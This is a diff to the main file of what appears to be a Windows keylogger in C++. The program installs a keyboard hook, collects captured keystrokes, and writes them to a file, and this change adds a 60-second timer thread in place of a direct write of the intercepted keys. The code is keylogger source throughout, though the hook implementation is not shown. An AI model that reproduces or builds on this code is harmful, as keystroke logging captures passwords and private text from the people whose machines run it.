@@ -1,9 +1,11 @@
 #include <windows.h>
 #include <winuser.h>
 #include <bits/stdc++.h>
+#include <future>
 
 #include "key_hook.h"
 #include "file_handler.h"
+#include "thread_handler.h"
 
 using namespace std;
 
@@ -17,7 +19,10 @@ int main()
     if (!check)
         return 0;
 
-    MessageBoxW(NULL, L"\t\tHooking\t\t", L"Close to close XD", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
+    thread_handler::run = true;
+    future<void> th = async(launch::async, thread_handler::timer, 60);
+
+    MessageBoxW(NULL, L"\tHooking\t", L"Close to close XD", MB_ICONEXCLAMATION | MB_SYSTEMMODAL);
 
     /*
     // in main release
@@ -30,8 +35,8 @@ int main()
     //end main release
     //*/
 
-    check = file_handler::write_intercept(key_proc::captured.str());
-    key_proc::captured.str("");
+    thread_handler::run = false;
+    th.get();
 
     check = key_hook::delete_hook();
     if (!check)
